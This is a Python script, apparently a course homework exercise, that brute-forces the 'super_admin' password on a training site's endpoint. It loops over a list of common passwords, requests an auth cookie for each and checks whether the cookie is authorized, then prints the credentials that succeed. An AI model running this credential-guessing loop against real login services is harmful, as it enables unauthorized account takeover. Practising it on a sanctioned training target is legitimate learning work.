import requests

most_common_passwords = ["password", "password", "123456", "123456", "123456", "123456", "123456", "123456", "123456",
                         "123456", "123456", "password", "password", "password", "password", "password", "password",
                         "123456789", "12345678", "12345678", "12345678", "12345", "12345678", "12345", "12345678",
                         "123456789", "qwerty", "qwerty", "abc123", "qwerty", "12345678", "qwerty", "12345678",
                         "qwerty", "12345678", "password", "abc123", "qwerty", "abc123", "qwerty", "12345", "football",
                         "12345", "12345", "1234567", "monkey", "monkey", "123456789", "123456789", "123456789",
                         "qwerty", "123456789", "111111", "12345678", "234567", "letmein", "111111", "1234", "football",
                         "1234567890", "letmein", "1234567", "12345", "letmein", "dragon", "1234567", "baseball",
                         "1234", "1234567", "1234567", "sunshine", "iloveyou", "trustno1", "111111", "iloveyou",
                         "dragon", "1234567", "princess", "football", "qwerty", "111111", "dragon", "baseball",
                         "adobe123[a]", "football", "baseball", "1234", "iloveyou", "iloveyou", "123123", "baseball",
                         "iloveyou", "123123", "1234567", "welcome", "login", "admin", "princess", "abc123", "111111",
                         "trustno1", "admin", "monkey", "1234567890", "welcome", "welcome", "admin", "qwerty123",
                         "iloveyou", "1234567", "1234567890", "letmein", "abc123", "solo", "monkey", "welcome",
                         "1q2w3e4r", "master", "sunshine", "letmein", "abc123", "111111", "abc123", "login", "666666",
                         "admin", "sunshine", "master", "photoshop[a]", "111111", "1qaz2wsx", "admin", "abc123",
                         "abc123", "qwertyuiop", "ashley", "123123", "1234", "mustang", "dragon", "121212", "starwars",
                         "football", "654321", "bailey", "welcome", "monkey", "access", "master", "flower", "123123",
                         "123123", "555555", "passw0rd", "shadow", "shadow", "shadow", "monkey", "passw0rd", "dragon",
                         "monkey", "lovely", "shadow", "ashley", "sunshine", "master", "letmein", "dragon", "passw0rd",
                         "654321", "7777777", "123123", "football", "12345", "michael", "login", "sunshine", "master",
                         "!@#$%^&*", "welcome", "654321", "jesus", "password1", "superman", "princess", "master",
                         "hello", "charlie", "888888", "superman", "michael", "princess", "696969", "qwertyuiop",
                         "hottie", "freedom", "aa123456", "princess", "qazwsx", "ninja", "azerty", "123123", "solo",
                         "loveme", "whatever", "donald", "dragon", "michael", "mustang", "trustno1", "batman",
                         "passw0rd", "zaq1zaq1", "qazwsx", "password1", "password1", "Football", "password1", "000000",
                         "trustno1", "starwars", "password1", "trustno1", "qwerty123", "123qwe"]
empty_login = {"login": "", "password": most_common_passwords}
not_existing_login = {"login": "any_user", "password": most_common_passwords}
not_existing_password = {"login": "super_admin", "password": "wrong_pwd"}



cookies = {}
'''
for playload in [empty_login, not_existing_login, not_existing_password]:
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=playload)
    if playload == empty_login:
        print(f"Login is empty {response.status_code}")
    elif playload == not_existing_login:
        print(f"Login does not exist {response.status_code}")
    elif playload == not_existing_password:
        print(f"Password is wrong {response.status_code}")

'''
for password in most_common_passwords:
    admin_credentials = {"login": "super_admin", "password": password}
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=admin_credentials)
    cookie_value = response1.cookies.get('auth_cookie')
    cookies.update({'auth_cookie': cookie_value})
    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    message = response2.text
    if message != "You are NOT authorized":
        print(response2.text)
        print(admin_credentials)


'''
# missing cookie
response3 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
print(response3.text)
'''